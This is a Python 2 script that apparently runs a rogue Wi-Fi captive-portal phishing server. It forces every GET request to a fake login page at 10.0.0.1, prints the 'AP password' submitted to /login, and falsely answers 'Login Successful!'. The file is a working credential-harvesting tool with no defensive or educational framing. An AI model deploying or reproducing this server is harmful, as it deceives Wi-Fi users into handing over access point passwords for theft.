from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from os import curdir, sep
import cgi

PORT_NUMBER = 80

# This class will handles any incoming request from
# the browser


class login_server(BaseHTTPRequestHandler):
    # Handler for the GET requests
    def do_GET(self):
        self.path = "/index.html"
        try:
            # Check the file extension required and
            # set the right mime type
            sendReply = False
            if self.path.endswith(".html"):
                mimetype = 'text/html'
                sendReply = True
            if self.path.endswith(".jpg"):
                mimetype = 'image/jpg'
                sendReply = True
            if self.path.endswith(".gif"):
                mimetype = 'image/gif'
                sendReply = True
            if self.path.endswith(".js"):
                mimetype = 'application/javascript'
                sendReply = True
            if self.path.endswith(".css"):
                mimetype = 'text/css'
                sendReply = True

            if sendReply is True:
                # Open the static file requested and send it
                f = open(curdir + sep + self.path)
                self.send_response(200)
                self.send_header('Content-type', mimetype)
                self.end_headers()
                self.wfile.write(f.read())
                f.close()
            return

        except IOError:
            self.send_response(301)
            self.send_header('Location','http:10.0.0.1:80/')
            self.end_headers()

    # Handler for the POST requests
    def do_POST(self):
        if self.path == "/login":
            form = cgi.FieldStorage(
                fp=self.rfile,
                headers=self.headers,
                environ={'REQUEST_METHOD': 'POST',
                         'CONTENT_TYPE': self.headers['Content-Type'], }
            )

            print "The AP password is: %s" % form["password"].value
            self.send_response(200)
            self.end_headers()
            self.wfile.write("Login Successful!")

try:
    # Create a web server and define the handler to manage the
    # incoming request
    server = HTTPServer(("10.0.0.1", PORT_NUMBER), login_server)
    print'Started Login server on port ', PORT_NUMBER
    print("Waiting for response...")
    # Wait forever for incoming htto requests
    server.serve_forever()
except KeyboardInterrupt:
    print('Shutting down the web server')
    server.shutdown()
